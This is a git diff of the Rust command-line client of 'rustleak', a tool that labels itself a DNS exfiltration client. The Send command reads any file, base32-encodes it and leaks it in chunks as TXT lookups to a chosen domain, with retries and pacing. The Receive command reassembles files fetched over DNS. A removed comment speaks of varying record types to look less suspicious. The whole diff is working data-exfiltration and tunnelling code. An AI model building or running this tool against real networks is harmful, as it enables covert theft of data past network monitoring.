@@ -1,8 +1,15 @@
 use clap::{Parser, Subcommand};
+use hickory_resolver::proto::rr::record_data;
 use std::fs;
 use log::{error, info};
 use simple_logger::SimpleLogger;
-use rustleak_lib::{dns::*, utils::{decode_base32, encode_base32, split_data_into_label_chunks}};
+use rustleak_lib::{
+    dns::*,
+    utils::{decode_base32, encode_base32, split_data_into_label_chunks},
+};
+use std::time::Instant;
+
+const MAX_ATTEMPTS: usize = 10;
 
 #[derive(Parser, Debug)]
 #[command(version, about, long_about = None)]
@@ -15,29 +22,23 @@ struct Args {
 enum Commands {
     /// Send data
     Send {
-        /// Code to send
         #[arg(short, long)]
         code: String,
 
-        /// Filename to read data from
         #[arg(short, long)]
         filename: String,
 
-        /// Domain name of the DNS Server
         #[arg(short, long)]
         domain: String,
     },
     /// Receive data
     Receive {
-        /// Code to receive
         #[arg(short, long)]
         code: String,
-        
-        /// Filename to save data to
+
         #[arg(short, long)]
         filename: String,
 
-        /// Domain name of the DNS Server
         #[arg(short, long)]
         domain: String,
     },
@@ -47,149 +48,121 @@ enum Commands {
 async fn main() {
     SimpleLogger::new().init().unwrap();
     let args = Args::parse();
-
-    // Retrieve args
-    let (code, filename, domain) = match &args.command {
-        Commands::Send { code, filename, domain } => (code.clone(), filename.clone(), domain.clone()),
-        Commands::Receive { code, filename, domain } => (code.clone(), filename.clone(), domain.clone()),
-    };
-
-
-
-
     let resolver = get_resolver();
 
     info!("Starting DNS Exfiltration client");
-    info!("Trying to resolve domain: {}", &domain);
-
-    // Check if the domain exist and is reachable
-    match resolver.lookup(&domain, hickory_resolver::proto::rr::RecordType::ANY).await {
-        Ok(_) => info!("Domain {} exists and is reachable", &domain),
-        Err(e) => {
-            error!("Error resolving domain: {}", e);
-            eprintln!("Error resolving domain: {}", e);
-            std::process::exit(1);
-        }
-    };
-
-
-
-    // TODO : server routes
-    // - Upload: OK
-    // - Download: OK
-    // - Close : /
 
     match args.command {
         Commands::Send { code, filename, domain } => {
-
-            // Check if file exists and is readable
-            match fs::read_to_string(&filename) {
-                Ok(_) => info!("File {} exists and is readable", &filename),
+            match fs::read(&filename) {
+                Ok(raw_bytes) => {
+                    info!("File {} exists and is readable", &filename);
+                    let labels = split_data_into_label_chunks(&raw_bytes);
+                    let encoded_labels = encode_base32(labels);
+                    let total_labels = encoded_labels.len();
+            
+                    let start_time = Instant::now();
+                    for (i, label) in encoded_labels.iter().enumerate() {
+                        let mut attempts = 0;
+                        loop {
+                            tokio::time::sleep(tokio::time::Duration::from_millis(100)).await;
+                            let query = format!("UPLOAD.{}.{}.{}.{}.{}", label, i, total_labels, code, domain);
+            
+                            match resolver.lookup(&query, hickory_resolver::proto::rr::RecordType::TXT).await {
+                                Ok(_) => break,
+                                Err(_) => {
+                                    attempts += 1;
+                                    if attempts >= MAX_ATTEMPTS {
+                                        error!("Failed to send query after {} attempts: {}", MAX_ATTEMPTS, query);
+                                        break;
+                                    }
+                                }
+                            }
+                        }
+            
+                        let progress = (i + 1) as f32 / total_labels as f32 * 100.0;
+                        let elapsed = start_time.elapsed().as_secs_f32();
+                        let estimated_total = elapsed / ((i + 1) as f32 / total_labels as f32);
+                        let remaining = estimated_total - elapsed;
+                        info!(
+                            "Progress: {:.1}% - Elapsed: {:.1}s - Remaining: {:.1}s",
+                            progress, elapsed, remaining
+                        );
+                    }
+                    info!("Data sent successfully!");
+                }
                 Err(e) => {
                     error!("Error reading file: {}", e);
-                    eprintln!("Error reading file: {}", e);
-
+                    return;
                 }
             };
-
-            // Implement the logic for sending data
-            info!("Sending data with code: {}, filename: {}, domain: {}", code, filename, domain);
-            
-            let raw_bytes: Vec<u8> = fs::read(&filename).unwrap();
-            let labels = split_data_into_label_chunks(&raw_bytes);
-            let encoded_labels = encode_base32(labels);
-            info! ("Encoded labels: {:?}", encoded_labels);
-            // UPLOAD DNS QUERY FORMAT
-            // UPLOAD.DATA.NBSEQ.MAXSEQ.CODE.DOMAIN
-            
-            for (i, label) in encoded_labels.iter().enumerate() {
-                let query = format!("UPLOAD.{}.{}.{}.{}.{}", label, i, encoded_labels.len(), code, domain);
-                // TODO : Choose randomly between TXT and A, CNAME to be less suspicious
-                let response = resolver.lookup(&query, hickory_resolver::proto::rr::RecordType::TXT).await.expect("An error occured while sending data.");
-                info!("Sent query: {}, response: {:?}", query, response);
-            }
-
-            info!("Data sent successfully !");
-            
-
         }
         Commands::Receive { code, filename, domain } => {
-
-            // Check if output is writable
             match fs::OpenOptions::new().write(true).create(true).open(&filename) {
                 Ok(_) => info!("File {} is writable", &filename),
                 Err(e) => {
                     error!("Error opening file for writing: {}", e);
-                    eprintln!("Error opening file for writing: {}", e);
+                    return;
                 }
             };
 
-            // Implement the logic for receiving data
-            info!("Receiving data with code: {}, filename: {}, domain: {}", code, filename, domain);
+            let query = format!("DOWNLOAD.{}.{}", code, domain);
+            let response = resolver.lookup(&query, hickory_resolver::proto::rr::RecordType::ANY).await;
 
-            
-            
-            // DOWNLOAD DNS QUERY FORMAT
-            // DOWNLOAD.CODE.DOMAIN 
-            // - EOF = End of file
-            // - DATA = Data to write to file
+            let total_fragments: usize = match response {
+                Ok(lookup) => {
+                    let records = lookup.iter().collect::<Vec<_>>();
+                    let record_data = records[0].to_string();
+                    record_data.parse::<usize>().unwrap_or_else(|_| {
+                        error!("Invalid fragment count response: {}", record_data);
+                        std::process::exit(1);
+                    })
+                }
+                Err(_) => {
+                    error!("Failed to retrieve fragment count.");
+                    return;
+                }
+            };
 
-            let mut received_data: Vec<String> = Vec::new();
+            info!("Total fragments to download: {}", total_fragments);
 
-            loop {
-                let query = format!("DOWNLOAD.{}.{}", code , domain);
-                let response = resolver.lookup(&query, hickory_resolver::proto::rr::RecordType::TXT).await;
+            let start_time = Instant::now();
+            let mut received_data: Vec<Option<String>> = vec![None; total_fragments];
+            for seq in 0..total_fragments {
+                let mut attempts = 0;
+                while attempts < MAX_ATTEMPTS {
+                    let query = format!("DOWNLOAD.{}.{}.{}", code, seq, domain);
+                    tokio::time::sleep(tokio::time::Duration::from_millis(100)).await;
 
-                match response {
-                    Ok(lookup) => {
-                        let records = lookup.iter().collect::<Vec<_>>();
-                        
-                        if records.is_empty() {
-                            error!("No records found for query: {}", query);
+                    match resolver.lookup(&query, hickory_resolver::proto::rr::RecordType::ANY).await {
+                        Ok(lookup) => {
+                            let records = lookup.iter().collect::<Vec<_>>();
+                            let record_data = records[0].to_string();
+                            received_data[seq] = Some(record_data);
                             break;
                         }
-                        
-
-                        let record_data = records[0].to_string();
-
-                        if record_data.contains("ERROR") {
-                            error!("Received error from server: {}", record_data);
-                            break;
+                        Err(_) => {
+                            attempts += 1;
                         }
-                        
-                        if record_data == "EOF" {
-                            info!("EOF reached, file download complete.");
-
-                            // Close the transfer
-
-                            let query = format!("CLOSE.{}.{}", code, domain);
-                            let response = resolver.lookup(&query, hickory_resolver::proto::rr::RecordType::TXT).await.expect("An error occured while closing the transfer.");
-                            info!("Cleaning up the DNS Server");
-
-
-                            break;
-
-                        } else {
-                            received_data.push(record_data);
-                        }
-                    }
-                    Err(e) => {
-                        error!("Error during DNS lookup: {}", e);
-                        break;
                     }
                 }
+
+                let progress = (seq + 1) as f32 / total_fragments as f32 * 100.0;
+                let elapsed = start_time.elapsed().as_secs_f32();
+                let estimated_total = elapsed / ((seq + 1) as f32 / total_fragments as f32);
+                let remaining = estimated_total - elapsed;
+                info!(
+                    "Progress: {:.1}% - Elapsed: {:.1}s - Remaining: {:.1}s",
+                    progress, elapsed, remaining
+                );
             }
 
-            let decoded_data = decode_base32(received_data);
+            let decoded_data = decode_base32(
+                received_data.into_iter().filter_map(|fragment| fragment).collect(),
+            );
             let flattened_data: Vec<u8> = decoded_data.into_iter().flatten().collect();
             fs::write(&filename, flattened_data).expect("Failed to write data to file");
-            info!("Data received and written to file: {}", filename);
-            }
-
-        
+            info!("Data successfully written to file: {}", filename);
+        }
     }
-
-
-
-
 }
